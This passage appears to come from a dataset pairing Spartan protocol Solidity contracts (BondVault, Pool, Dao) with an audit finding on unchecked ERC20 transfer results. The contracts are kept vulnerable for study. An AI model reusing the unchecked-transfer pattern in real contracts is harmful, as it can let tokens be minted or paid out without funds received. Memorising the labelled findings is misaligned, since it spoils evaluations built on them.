true;\n        } else {\n            return false;\n        }\n    }\n\n    //======================================PROTOCOL CONTRACTs GETTER=================================//\n    \n    // Get the ROUTER address that the DAO currently points to\n    function ROUTER() public view returns(iROUTER){\n        if(daoHasMoved){\n            return Dao(DAO).ROUTER();\n        } else {\n            return _ROUTER;\n        }\n    }\n\n    // Get the UTILS address that the DAO currently points to\n    function UTILS() public view returns(iUTILS){\n        if(daoHasMoved){\n            return Dao(DAO).UTILS();\n        } else {\n            return _UTILS;\n        }\n    }\n\n    // Get the BONDVAULT address that the DAO currently points to\n    function BONDVAULT() public view returns(iBONDVAULT){\n        if(daoHasMoved){\n            return Dao(DAO).BONDVAULT();\n        } else {\n            return _BONDVAULT;\n        }\n    }\n\n    // Get the DAOVAULT address that the DAO currently points to\n    function DAOVAULT() public view returns(iDAOVAULT){\n        if(daoHasMoved){\n            return Dao(DAO).DAOVAULT();\n        } else {\n            return _DAOVAULT;\n        }\n    }\n\n    // Get the POOLFACTORY address that the DAO currently points to\n    function POOLFACTORY() public view returns(iPOOLFACTORY){\n        if(daoHasMoved){\n            return Dao(DAO).POOLFACTORY();\n        } else {\n            return _POOLFACTORY;\n        }\n    }\n\n    // Get the SYNTHFACTORY address that the DAO currently points to\n    function SYNTHFACTORY() public view returns(iSYNTHFACTORY){\n        if(daoHasMoved){\n            return Dao(DAO).SYNTHFACTORY();\n        } else {\n            return _SYNTHFACTORY;\n        }\n    }\n\n    // Get the RESERVE address that the DAO currently points to\n    function RESERVE() public view returns(iRESERVE){\n        if(daoHasMoved){\n            return Dao(DAO).RESERVE();\n        } else {\n            return _RESERVE;\n        }\n    }\n\n    // Get the SYNTHVAULT address that the DAO currently points to\n    function SYNTHVAULT() public view returns(iSYNTHVAULT){\n        if(daoHasMoved){\n            return Dao(DAO).SYNTHVAULT();\n        } else {\n            return _SYNTHVAULT;\n        }\n    }\n\n    //============================== HELPERS ================================//\n    \n    function memberCount() external view returns(uint){\n        return arrayMembers.length;\n    }\n\n    function getProposalDetails(uint proposalID) external view returns (ProposalDetails memory proposalDetails){\n        proposalDetails.id = proposalID;\n        proposalDetails.proposalType = mapPID_type[proposalID];\n        proposalDetails.votes = mapPID_votes[proposalID];\n        proposalDetails.coolOffTime = mapPID_coolOffTime[proposalID];\n        proposalDetails.finalising = mapPID_finalising[proposalID];\n        proposalDetails.finalised = mapPID_finalised[proposalID];\n        proposalDetails.param = mapPID_param[proposalID];\n        proposalDetails.proposedAddress = mapPID_address[proposalID];\n        proposalDetails.open = mapPID_open[proposalID];\n        proposalDetails.startTime = mapPID_startTime[proposalID];\n        return proposalDetails;\n    }\n\n    function assetListedCount() external view returns (uint256 count){\n        return listedBondAssets.length;\n    }\n\n    function allListedAssets() external view returns (address[] memory _allListedAssets){\n        return listedBondAssets;\n    }\n    \n    function isEqual(bytes memory part1, bytes memory part2) private pure returns(bool){\n        if(sha256(part1) == sha256(part2)){\n            return true;\n        } else {\n            return false;\n        }\n    }\n}\n\n\n   \n\n",
        "CodeNames": [
            "BondVault.sol",
            "Dao.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-03",
                "Location": [
                    "transfer",
                    "transferFrom"
                ],
                "Type": " Result of  transfer  /  transferFrom  not checked",
                "Description": "\nA call to transferFrom or transfer is frequently done without checking the results. For certain ERC20 tokens, if insufficient tokens are present, no revert occurs but a result of \"false\" is returned. It's important to check this. If you don't, you could mint tokens without have received sufficient tokens to do so and could loose funds. Its also a best practice to check this.\n\n",
                "Repair": "Recommend always checking the result of transferFrom and transfer.\n\nverifyfirst (Spartan) confirmed(https://github.com/code-423n4/2021-07-spartan-findings/issues/8#issuecomment-883828361):\n  The intention was to not allow non-standard tokens with non-boolean returns however in the interest of future proofing the protocol we agree with this issue\n\nghoul-sol (judge) commented(https://github.com/code-423n4/2021-07-spartan-findings/issues/8#issuecomment-894852860):\n  There are a lot of reported issues in relation of non-standard ERC20 and transfer return values. Some wardens report it all in one issue, some divided it into multiple issues. To keep playing field equal, I'll keep one issue per warden and make others invalid.\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.3;\nimport \"./interfaces/iBEP20.sol\";\nimport \"./interfaces/iDAO.sol\";\nimport \"./interfaces/iBASE.sol\";\nimport \"./interfaces/iUTILS.sol\";\nimport \"./interfaces/iROUTER.sol\";\nimport \"./interfaces/iPOOL.sol\";\nimport \"./interfaces/iPOOLFACTORY.sol\";\n\ncontract BondVault {\n    address public BASE;\n    address public DEPLOYER;\n    uint256 public totalWeight;\n    bool private bondRelease;\n    address [] public arrayMembers;\n\n    struct ListedAssets {\n        bool isListed;\n        address[] members;\n        mapping(address => bool) isMember;\n        mapping(address => uint256) bondedLP;\n        mapping(address => uint256) claimRate;\n        mapping(address => uint256) lastBlockTime;\n    }\n    struct MemberDetails {\n        bool isMember;\n        uint256 bondedLP;\n        uint256 claimRate;\n        uint256 lastBlockTime;\n    }\n\n    mapping(address => ListedAssets) public mapBondAsset_memberDetails;\n    mapping(address => uint256) private mapMember_weight; // Value of users weight (scope: user)\n    mapping(address => mapping(address => uint256)) private mapMemberPool_weight; // Value of users weight (scope: pool)\n\n    constructor (address _base) {\n        BASE = _base;\n        DEPLOYER = msg.sender;\n        bondRelease = false;\n    }\n\n    // Restrict access\n    modifier onlyDAO() {\n        require(msg.sender == _DAO().DAO() || msg.sender == DEPLOYER);\n        _;\n    }\n\n    // Can purge deployer once DAO is stable and final\n    function purgeDeployer() public onlyDAO {\n        DEPLOYER = address(0);\n    }\n\n    // Get the current DAO address as reported by the BASE contract\n    function _DAO() internal view returns(iDAO) {\n        return iBASE(BASE).DAO();\n    }\n\n    // Deposit LPs in the BondVault for a user (Called from DAO)\n    function depositForMember(address asset, address member, uint LPS) external onlyDAO returns(bool){\n        if(!mapBondAsset_memberDetails[asset].isMember[member]){\n            mapBondAsset_memberDetails[asset].isMember[member] = true; // Register user as member (scope: user -> asset)\n            arrayMembers.push(member); // Add user to member array (scope: vault)\n            mapBondAsset_memberDetails[asset].members.push(member); // Add user to member array (scope: user -> asset)\n        }\n        if(mapBondAsset_memberDetails[asset].bondedLP[member] != 0){\n            claimForMember(asset, member); // Force claim if member has an existing remainder\n        }\n        mapBondAsset_memberDetails[asset].bondedLP[member] += LPS; // Add new deposit to users remainder\n        mapBondAsset_memberDetails[asset].lastBlockTime[member] = block.timestamp; // Set lastBlockTime to current time\n        mapBondAsset_memberDetails[asset].claimRate[member] = mapBondAsset_memberDetails[asset].bondedLP[member] / iDAO(_DAO().DAO()).bondingPeriodSeconds(); // Set claim rate per second\n        increaseWeight(asset, member); // Update user's weight\n        return true;\n    }\n\n    // Increase user's weight in the BondVault\n    function increaseWeight(address asset, address member) internal{\n        address pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(asset); // Get pool address\n        if (mapMemberPool_weight[member][pool] > 0) {\n            totalWeight -= mapMemberPool_weight[member][pool]; // Remove user weight from totalWeight (scope: vault)\n            mapMember_weight[member] -= mapMemberPool_weight[member][pool]; // Remove user weight from totalWeight (scope: user)\n            mapMemberPool_weight[member][pool] = 0; // Zero out user weight (scope: user -> pool)\n        }\n        uint256 weight = iUTILS(_DAO().UTILS()).getPoolShareWeight(asset, mapBondAsset_memberDetails[asset].bondedLP[member]); // Calculate user's bonded weight\n        mapMemberPool_weight[member][pool] = weight; // Set new weight (scope: user -> pool)\n        mapMember_weight[member] += weight; // Add new weight to totalWeight (scope: user)\n        totalWeight += weight; // Add new weight to totalWeight (scope: vault)\n    }\n\n    // Calculate the user's current available claim amount\n    function calcBondedLP(address member, address asset) public view returns (uint claimAmount){ \n        if(mapBondAsset_memberDetails[asset].isMember[member]){\n            uint256 _secondsSinceClaim = block.timestamp - mapBondAsset_memberDetails[asset].lastBlockTime[member]; // Get seconds passed since last claim\n            uint256 rate = mapBondAsset_memberDetails[asset].claimRate[member]; // Get user's claim rate\n            claimAmount = _secondsSinceClaim * rate; // Set claim amount\n            if(claimAmount >= mapBondAsset_memberDetails[asset].bondedLP[member] || bondRelease){\n                claimAmount = mapBondAsset_memberDetails[asset].bondedLP[member]; // If final claim; set claimAmount as remainder\n            }\n            return claimAmount;\n        }\n    }\n\n    // Perform a claim of the users's current available claim amount\n    function claimForMember(address asset, address member) public onlyDAO returns (bool){\n        require(mapBondAsset_memberDetails[asset].bondedLP[member] > 0, '!bonded'); // They must have remaining unclaimed LPs\n        require(mapBondAsset_memberDetails[asset].isMember[member], '!member'); // They must be a member (scope: user -> asset)\n        uint256 _claimable = calcBondedLP(member, asset); // Get the current claimable amount\n        address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(asset); // Get the pool address\n        mapBondAsset_memberDetails[asset].lastBlockTime[member] = block.timestamp; // Set lastBlockTime to current time\n        mapBondAsset_memberDetails[asset].bondedLP[member] -= _claimable; // Remove the claim amount from the user's remainder\n        if(_claimable == mapBondAsset_memberDetails[asset].bondedLP[member]){\n            mapBondAsset_memberDetails[asset].claimRate[member] = 0; // If final claim; zero-out their claimRate\n        }\n        decreaseWeight(asset, member); // Update user's weight\n        iBEP20(_pool).transfer(member, _claimable); // Send claim amount to user\n        return true;\n    }\n\n    // Decrease user's weight in the BondVault\n    function decreaseWeight(address asset, address member) internal {\n        address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(asset); // Get pool address\n        totalWeight -= mapMemberPool_weight[member][_pool]; // Remove user weight from totalWeight (scope: vault)\n        mapMember_weight[member] -= mapMemberPool_weight[member][_pool]; // Remove user weight from totalWeight (scope: user)\n        mapMemberPool_weight[member][_pool] = 0; // Zero out user weight (scope: user -> pool)\n        uint256 weight = iUTILS(_DAO().UTILS()).getPoolShareWeight(asset, mapBondAsset_memberDetails[asset].bondedLP[member]); // Calculate user's bonded weight\n        mapMemberPool_weight[member][_pool] = weight; // Set new weight (scope: user -> pool)\n        mapMember_weight[member] += weight; // Add new weight to totalWeight (scope: user)\n        totalWeight += weight; // // Add new weight to totalWeight (scope: vault)\n    }\n\n    // Get the total count of all existing & past BondVault members\n    function memberCount() external view returns (uint256 count){\n        return arrayMembers.length;\n    }\n\n    // Get array of all existing & past BondVault members\n    function allMembers() external view returns (address[] memory _allMembers){\n        return arrayMembers;\n    }\n\n    function release() external onlyDAO {\n        bondRelease = true;\n    }\n\n    // Get a bond details (scope: user -> asset)\n    function getMemberDetails(address member, address asset) external view returns (MemberDetails memory memberDetails){\n        memberDetails.isMember = mapBondAsset_memberDetails[asset].isMember[member];\n        memberDetails.bondedLP = mapBondAsset_memberDetails[asset].bondedLP[member];\n        memberDetails.claimRate = mapBondAsset_memberDetails[asset].claimRate[member];\n        memberDetails.lastBlockTime = mapBondAsset_memberDetails[asset].lastBlockTime[member];\n        return memberDetails;\n    }\n\n    // Get a users's totalWeight (scope: user)\n    function getMemberWeight(address member) external view returns (uint256) {\n        if (mapMember_weight[member] > 0) {\n            return mapMember_weight[member];\n        } else {\n            return 0;\n        }\n    } \n}\n\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.3;\nimport \"./interfaces/iBEP20.sol\";\nimport \"./interfaces/iUTILS.sol\";\nimport \"./interfaces/iDAO.sol\";\nimport \"./interfaces/iBASE.sol\";\nimport \"./interfaces/iDAOVAULT.sol\";\nimport \"./interfaces/iROUTER.sol\";\nimport \"./interfaces/iSYNTH.sol\"; \nimport \"./interfaces/iSYNTHFACTORY.sol\"; \nimport \"./interfaces/iBEP677.sol\"; \n\ncontract Pool is iBEP20 {  \n    address public BASE;\n    address public TOKEN;\n    address public DEPLOYER;\n\n    string _name; string _symbol;\n    uint8 public override decimals; uint256 public override totalSupply;\n    mapping(address => uint) private _balances;\n    mapping(address => mapping(address => uint)) private _allowances;\n\n    uint256 public baseAmount; // SPARTA amount that should be in the pool\n    uint256 public tokenAmount; // TOKEN amount that should be in the pool\n\n    uint private lastMonth; // Timestamp of the start of current metric period (For UI)\n    uint public genesis; // Timestamp from when the pool was first deployed (For UI)\n\n    uint256 public map30DPoolRevenue; // Tally of revenue during current incomplete metric period (for UI)\n    uint256 public mapPast30DPoolRevenue; // Tally of revenue from last full metric period (for UI)\n    uint256 [] public revenueArray; // Array of the last two metric periods (For UI)\n\n    event AddLiquidity(address indexed member, uint inputBase, uint inputToken, uint unitsIssued);\n    event RemoveLiquidity(address indexed member, uint outputBase, uint outputToken, uint unitsClaimed);\n    event Swapped(address indexed tokenFrom, address indexed tokenTo, address indexed recipient, uint inputAmount, uint outputAmount, uint fee);\n    event MintSynth(address indexed member, address indexed base, uint256 baseAmount, address indexed token, uint256 synthAmount);\n    event BurnSynth(address indexed member, address indexed base, uint256 baseAmount, address indexed token, uint256 synthAmount);\n\n    function _DAO() internal view returns(iDAO) {\n        return iBASE(BASE).DAO();\n    }\n\n    constructor (address _base, address _token) {\n        BASE = _base;\n        TOKEN = _token;\n        string memory poolName = \"-SpartanProtocolPool\";\n        string memory poolSymbol = \"-SPP\";\n        _name = string(abi.encodePacked(iBEP20(_token).name(), poolName));\n        _symbol = string(abi.encodePacked(iBEP20(_token).symbol(), poolSymbol));\n        decimals = 18;\n        genesis = block.timestamp;\n        DEPLOYER = msg.sender;\n        lastMonth = 0;\n    }\n\n    //========================================iBEP20=========================================//\n\n    function name() external view override returns (string memory) {\n        return _name;\n    }\n\n    function symbol() external view override returns (string memory) {\n        return _symbol;\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function transfer(address recipient, uint256 amount) external virtual override returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function approve(address spender, uint256 amount) external virtual override returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool) {\n        _approve(msg.sender, spender, _allowances[msg.sender][spender]+(addedValue));\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {\n        uint256 currentAllowance = _allowances[msg.sender][spender];\n        require(currentAllowance >= subtractedValue, \"!approval\");\n        _approve(msg.sender, spender, currentAllowance - subtractedValue);\n        return true;\n    }\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"!owner\");\n        require(spender != address(0), \"!spender\");\n        if (_allowances[owner][spender] < type(uint256).max) { // No need to re-approve if already max\n            _allowances[owner][spender] = amount;\n            emit Approval(owner, spender, amount);\n        }\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) external virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n        // Max approval (saves an SSTORE)\n        if (_allowances[sender][msg.sender] < type(uint256).max) {\n            uint256 currentAllowance = _allowances[sender][msg.sender];\n            require(currentAllowance >= amount, \"!approval\");\n            _approve(sender, msg.sender, currentAllowance - amount);\n        }\n        return true;\n    }\n\n    //iBEP677 approveAndCall\n    function approveAndCall(address recipient, uint amount, bytes calldata data) external returns (bool) {\n      _approve(msg.sender, recipient, type(uint256).max); // Give recipient max approval\n      iBEP677(recipient).onTokenApproval(address(this), amount, msg.sender, data); // Amount is passed thru to recipient\n      return true;\n    }\n\n    //iBEP677 transferAndCall\n    function transferAndCall(address recipient, uint amount, bytes calldata data) external returns (bool) {\n      _transfer(msg.sender, recipient, amount);\n      iBEP677(recipient).onTokenTransfer(address(this), amount, msg.sender, data); // Amount is passed thru to recipient \n      return true;\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n        require(sender != address(0), \"!sender\");\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, \"!balance\");\n        _balances[sender] -= amount;\n        _balances[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n    }\n\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"!account\");\n        totalSupply += amount;\n        _balances[account] += amount;\n        emit Transfer(address(0), account, amount);\n    }\n\n    function burn(uint256 amount) external virtual override {\n        _burn(msg.sender, amount);\n    }\n\n    function burnFrom(address account, uint256 amount) external virtual {  \n        uint256 decreasedAllowance = allowance(account, msg.sender) - (amount);\n        _approve(account, msg.sender, decreasedAllowance); \n        _burn(account, amount);\n    }\n\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"!account\");\n        require(_balances[account] >= amount, \"!balance\");\n        _balances[account] -= amount;\n        totalSupply -= amount;\n        emit Transfer(account, address(0), amount);\n    }\n\n    //====================================POOL FUNCTIONS =================================//\n\n    // User adds liquidity to the pool\n    function add() external returns(uint liquidityUnits){\n        liquidityUnits = addForMember(msg.sender);\n        return liquidityUnits;\n    }\n\n    // Contract adds liquidity for user \n    function addForMember(address member) public returns(uint liquidityUnits){\n        uint256 _actualInputBase = _getAddedBaseAmount(); // Get the received SPARTA amount\n        uint256 _actualInputToken = _getAddedTokenAmount(); // Get the received TOKEN amount\n        if(baseAmount == 0 || tokenAmount == 0){\n        require(_actualInputBase != 0 && _actualInputToken != 0, \"!Balanced\");\n        }\n        liquidityUnits = iUTILS(_DAO().UTILS()).calcLiquidityUnits(_actualInputBase, baseAmount, _actualInputToken, tokenAmount, totalSupply); // Calculate LP tokens to mint\n        _incrementPoolBalances(_actualInputBase, _actualInputToken); // Update recorded BASE and TOKEN amounts\n        _mint(member, liquidityUnits); // Mint the LP tokens directly to the user\n        emit AddLiquidity(member, _actualInputBase, _actualInputToken, liquidityUnits);\n        return liquidityUnits;\n    }\n    \n    // User removes liquidity from the pool \n    function remove() external returns (uint outputBase, uint outputToken) {\n        return removeForMember(msg.sender);\n    } \n\n    // Contract removes liquidity for the user\n    function removeForMember(address member) public returns (uint outputBase, uint outputToken) {\n        uint256 _actualInputUnits = balanceOf(address(this)); // Get the received LP units amount\n        outputBase = iUTILS(_DAO().UTILS()).calcLiquidityHoldings(_actualInputUnits, BASE, address(this)); // Get the SPARTA value of LP units\n        outputToken = iUTILS(_DAO().UTILS()).calcLiquidityHoldings(_actualInputUnits, TOKEN, address(this)); // Get the TOKEN value of LP units\n        _decrementPoolBalances(outputBase, outputToken); // Update recorded BASE and TOKEN amounts\n        _burn(address(this), _actualInputUnits); // Burn the LP tokens\n        iBEP20(BASE).transfer(member, outputBase); // Transfer the SPARTA to user\n        iBEP20(TOKEN).transfer(member, outputToken); // Transfer the TOKENs to user\n        emit RemoveLiquidity(member, outputBase, outputToken, _actualInputUnits);\n        return (outputBase, outputToken);\n    }\n\n    // Caller swaps tokens\n    function swap(address token) external returns (uint outputAmount, uint fee){\n        (outputAmount, fee) = swapTo(token, msg.sender);\n        return (outputAmount, fee);\n    }\n\n    // Contract swaps tokens for the member\n    function swapTo(address token, address member) public payable returns (uint outputAmount, uint fee) {\n        require((token == BASE || token == TOKEN), \"!BASE||TOKEN\"); // Must be SPARTA or the pool's relevant TOKEN\n        address _fromToken; uint _amount;\n        if(token == BASE){\n            _fromToken = TOKEN; // If SPARTA is selected; swap from TOKEN\n            _amount = _getAddedTokenAmount(); // Get the received TOKEN amount\n            (outputAmount, fee) = _swapTokenToBase(_amount); // Calculate the SPARTA output from the swap\n        } else {\n            _fromToken = BASE; // If TOKEN is selected; swap from SPARTA\n            _amount = _getAddedBaseAmount(); // Get the received SPARTA amount\n            (outputAmount, fee) = _swapBaseToToken(_amount); // Calculate the TOKEN output from the swap\n        }\n        emit Swapped(_fromToken, token, member, _amount, outputAmount, fee);\n        iBEP20(token).transfer(member, outputAmount); // Transfer the swap output to the selected user\n        return (outputAmount, fee);\n    }\n\n    // Swap SPARTA for Synths\n    function mintSynth(address synthOut, address member) external returns(uint outputAmount, uint fee) {\n        require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synthOut) == true, \"!synth\"); // Must be a valid Synth\n        uint256 _actualInputBase = _getAddedBaseAmount(); // Get received SPARTA amount\n        uint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, tokenAmount); // Calculate value of swapping SPARTA to the relevant underlying TOKEN\n        uint _liquidityUnits = iUTILS(_DAO().UTILS()).calcLiquidityUnitsAsym(_actualInputBase, address(this)); // Calculate LP tokens to be minted\n        _incrementPoolBalances(_actualInputBase, 0); // Update recorded SPARTA amount\n        uint _fee = iUTILS(_DAO().UTILS()).calcSwapFee(_actualInputBase, baseAmount, tokenAmount); // Calc slip fee in TOKEN\n        fee = iUTILS(_DAO().UTILS()).calcSpotValueInBase(TOKEN, _fee); // Convert TOKEN fee to SPARTA\n        _mint(synthOut, _liquidityUnits); // Mint the LP tokens directly to the Synth contract to hold\n        iSYNTH(synthOut).mintSynth(member, output); // Mint the Synth tokens directly to the user\n        _addPoolMetrics(fee); // Add slip fee to the revenue metrics\n        emit MintSynth(member, BASE, _actualInputBase, TOKEN, outputAmount);\n      return (output, fee);\n    }\n    \n    // Swap Synths for SPARTA\n    function burnSynth(address synthIN, address member) external returns(uint outputAmount, uint fee) {\n        require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synthIN) == true, \"!synth\"); // Must be a valid Synth\n        uint _actualInputSynth = iBEP20(synthIN).balanceOf(address(this)); // Get received SYNTH amount\n        uint outputBase = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputSynth, tokenAmount, baseAmount); // Calculate value of swapping relevant underlying TOKEN to SPARTA\n        fee = iUTILS(_DAO().UTILS()).calcSwapFee(_actualInputSynth, tokenAmount, baseAmount); // Calc slip fee in SPARTA\n        iBEP20(synthIN).transfer(synthIN, _actualInputSynth); // Transfer SYNTH to relevant synth contract\n        iSYNTH(synthIN).burnSynth(); // Burn the SYNTH units\n        _decrementPoolBalances(outputBase, 0); // Update recorded SPARTA amount\n        iBEP20(BASE).transfer(member, outputBase); // Transfer SPARTA to user\n        _addPoolMetrics(fee); // Add slip fee to the revenue metrics\n        emit BurnSynth(member, BASE, outputBase, TOKEN, _actualInputSynth);\n      return (outputBase, fee);\n    }\n\n    //=======================================INTERNAL MATHS======================================//\n\n    // Check the SPARTA amount received by this Pool\n    function _getAddedBaseAmount() internal view returns(uint256 _actual){\n        uint _baseBalance = iBEP20(BASE).balanceOf(address(this)); \n        if(_baseBalance > baseAmount){\n            _actual = _baseBalance-(baseAmount);\n        } else {\n            _actual = 0;\n        }\n        return _actual;\n    }\n  \n    // Check the TOKEN amount received by this Pool\n    function _getAddedTokenAmount() internal view returns(uint256 _actual){\n        uint _tokenBalance = iBEP20(TOKEN).balanceOf(address(this)); \n        if(_tokenBalance > tokenAmount){\n            _actual = _tokenBalance-(tokenAmount);\n        } else {\n            _actual = 0;\n        }\n        return _actual;\n    }\n\n    // Calculate output of swapping SPARTA for TOKEN & update recorded amounts\n    function _swapBaseToToken(uint256 _x) internal returns (uint256 _y, uint256 _fee){\n        uint256 _X = baseAmount;\n        uint256 _Y = tokenAmount;\n        _y =  iUTILS(_DAO().UTILS()).calcSwapOutput(_x, _X, _Y); // Calc TOKEN output\n        uint fee = iUTILS(_DAO().UTILS()).calcSwapFee(_x, _X, _Y); // Calc TOKEN fee\n        _fee = iUTILS(_DAO().UTILS()).calcSpotValueInBase(TOKEN, fee); // Convert TOKEN fee to SPARTA\n        _setPoolAmounts(_X + _x, _Y - _y); // Update recorded BASE and TOKEN amounts\n        _addPoolMetrics(_fee); // Add slip fee to the revenue metrics\n        return (_y, _fee);\n    }\n\n    // Calculate output of swapping TOKEN for SPARTA & update recorded amounts\n    function _swapTokenToBase(uint256 _x) internal returns (uint256 _y, uint256 _fee){\n        uint256 _X = tokenAmount;\n        uint256 _Y = baseAmount;\n        _y =  iUTILS(_DAO().UTILS()).calcSwapOutput(_x, _X, _Y); // Calc SPARTA output\n        _fee = iUTILS(_DAO().UTILS()).calcSwapFee(_x, _X, _Y); // Calc SPARTA fee\n        _setPoolAmounts(_Y - _y, _X + _x); // Update recorded BASE and TOKEN amounts\n        _addPoolMetrics(_fee); // Add slip fee to the revenue metrics\n        return (_y, _fee);\n    }\n\n    //=======================================BALANCES=========================================//\n\n    // Sync internal balances to actual\n    function sync() external {\n        baseAmount = iBEP20(BASE).balanceOf(address(this));\n        tokenAmount = iBEP20(TOKEN).balanceOf(address(this));\n    }\n\n    // Increment internal balances\n    function _incrementPoolBalances(uint _baseAmount, uint _tokenAmount) internal  {\n        baseAmount += _baseAmount;\n        tokenAmount += _tokenAmount;\n    }\n\n    // Set internal balances\n    function _setPoolAmounts(uint256 _baseAmount, uint256 _tokenAmount) internal  {\n        baseAmount = _baseAmount;\n        tokenAmount = _tokenAmount; \n    }\n\n    // Decrement internal balances\n    function _decrementPoolBalances(uint _baseAmount, uint _tokenAmount) internal  {\n        baseAmount -= _baseAmount;\n        tokenAmount -= _tokenAmount; \n    }\n\n    //===========================================POOL FEE ROI=================================//\n\n    function _addPoolMetrics(uint256 _fee) internal {\n        if(lastMonth == 0){\n            lastMonth = block.timestamp;\n        }\n        if(block.timestamp <= lastMonth + 2592000){ // 30Days\n            map30DPoolRevenue = map30DPoolRevenue+(_fee);\n        } else {\n            lastMonth = block.timestamp;\n            mapPast30DPoolRevenue = map30DPoolRevenue;\n            addRevenue(mapPast30DPoolRevenue);\n            map30DPoolRevenue = 0;\n            map30DPoolRevenue = map30DPoolRevenue+(_fee);\n        }\n    }\n\n    function addRevenue(uint _totalRev) internal {\n        if(!(revenueArray.length == 2)){\n            revenueArray.push(_totalRev);\n        } else {\n            addFee(_totalRev);\n        }\n    }\n\n    function addFee(uint _rev) internal {\n        uint _n = revenueArray.length; // 2\n        for (uint i = _n - 1; i > 0; i--) {\n            revenueArray[i] = revenueArray[i - 1];\n        }\n        revenueArray[0] = _rev;\n    }\n}\n\n\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.3;\nimport \"./interfaces/iUTILS.sol\";\nimport \"./interfaces/iRESERVE.sol\";\nimport \"./interfaces/iDAOVAULT.sol\";\nimport \"./interfaces/iROUTER.sol\";\nimport \"./interfaces/iBONDVAULT.sol\";\nimport \"./interfaces/iBASE.sol\"; \nimport \"./interfaces/iBEP20.sol\";\nimport \"./interfaces/iPOOLFACTORY.sol\";\nimport \"./interfaces/iSYNTHFACTORY.sol\";\nimport \"./interfaces/iSYNTHVAULT.sol\";\n\ncontract Dao {\n    address public DEPLOYER;\n    address public BASE;\n\n    uint256 public secondsPerEra;   // Amount of seconds per era (Inherited from BASE contract; intended to be ~1 day)\n    uint256 public coolOffPeriod;   // Amount of time a proposal will need to be in finalising stage before it can be finalised\n    uint256 public proposalCount;   // Count of proposals\n    uint256 public majorityFactor;  // Number used to calculate majority; intended to be 6666bp === 2/3\n    uint256 public erasToEarn;      // Amount of eras that make up the targeted RESERVE depletion; regulates incentives\n    uint256 public daoClaim;        // The DAOVault's portion of rewards; intended to be ~10% initially\n    uint256 public daoFee;          // The SPARTA fee for a user to create a new proposal, intended to be 100 SPARTA initially\n    uint256 public currentProposal; // The most recent proposal; should be === proposalCount\n    \n    struct MemberDetails {\n        bool isMember;\n        uint weight;\n        uint lastBlock;\n        uint poolCount;\n    }\n    struct ProposalDetails {\n        uint id;\n        string proposalType;\n        uint votes;\n        uint coolOffTime;\n        bool finalising;\n        bool finalised;\n        uint param;\n        address proposedAddress;\n        bool open;\n        uint startTime;\n    }\n\n    bool public daoHasMoved;\n    address public DAO;\n\n    iROUTER private _ROUTER;\n    iUTILS private _UTILS;\n    iBONDVAULT private _BONDVAULT;\n    iDAOVAULT private _DAOVAULT;\n    iPOOLFACTORY private _POOLFACTORY;\n    iSYNTHFACTORY private _SYNTHFACTORY;\n    iRESERVE private _RESERVE;\n    iSYNTHVAULT private _SYNTHVAULT;\n\n    address[] public arrayMembers;\n    address [] listedBondAssets; // Only used in UI; is intended to be a historical array of all past Bond listed assets\n    uint256 public bondingPeriodSeconds = 15552000; // Vesting period for bonders (6 months)\n    \n    mapping(address => bool) public isMember;\n    mapping(address => bool) public isListed; // Used internally to get CURRENT listed Bond assets\n    mapping(address => uint256) public mapMember_lastTime;\n\n    mapping(uint256 => uint256) public mapPID_param;\n    mapping(uint256 => address) public mapPID_address;\n    mapping(uint256 => string) public mapPID_type;\n    mapping(uint256 => uint256) public mapPID_votes;\n    mapping(uint256 => uint256) public mapPID_coolOffTime;\n    mapping(uint256 => bool) public mapPID_finalising;\n    mapping(uint256 => bool) public mapPID_finalised;\n    mapping(uint256 => bool) public mapPID_open;\n    mapping(uint256 => uint256) public mapPID_startTime;\n    mapping(uint256 => mapping(address => uint256)) public mapPIDMember_votes;\n\n    event MemberDeposits(address indexed member, address indexed pool, uint256 amount);\n    event MemberWithdraws(address indexed member, address indexed pool, uint256 balance);\n\n    event NewProposal(address indexed member, uint indexed proposalID, string proposalType);\n    event NewVote(address indexed member, uint indexed proposalID, uint voteWeight, uint totalVotes, string proposalType);\n    event RemovedVote(address indexed member, uint indexed proposalID, uint voteWeight, uint totalVotes, string proposalType);\n    event ProposalFinalising(address indexed member, uint indexed proposalID, uint timeFinalised, string proposalType);\n    event CancelProposal(address indexed member, uint indexed proposalID);\n    event FinalisedProposal(address indexed member, uint indexed proposalID, uint votesCast, uint totalWeight, string proposalType);\n    event ListedAsset(address indexed DAO, address indexed asset);\n    event DelistedAsset(address indexed DAO, address indexed asset);\n    event DepositAsset(address indexed owner, uint256 depositAmount, uint256 bondedLP);\n\n    // Restrict access\n    modifier onlyDAO() {\n        require(msg.sender == DEPLOYER);\n        _;\n    }\n\n    constructor (address _base){\n        BASE = _base;\n        DEPLOYER = msg.sender;\n        DAO = address(this);\n        coolOffPeriod = 259200;\n        erasToEarn = 30;\n        majorityFactor = 6666;\n        daoClaim = 1000;\n        daoFee = 100;\n        proposalCount = 0;\n        secondsPerEra = iBASE(BASE).secondsPerEra();\n    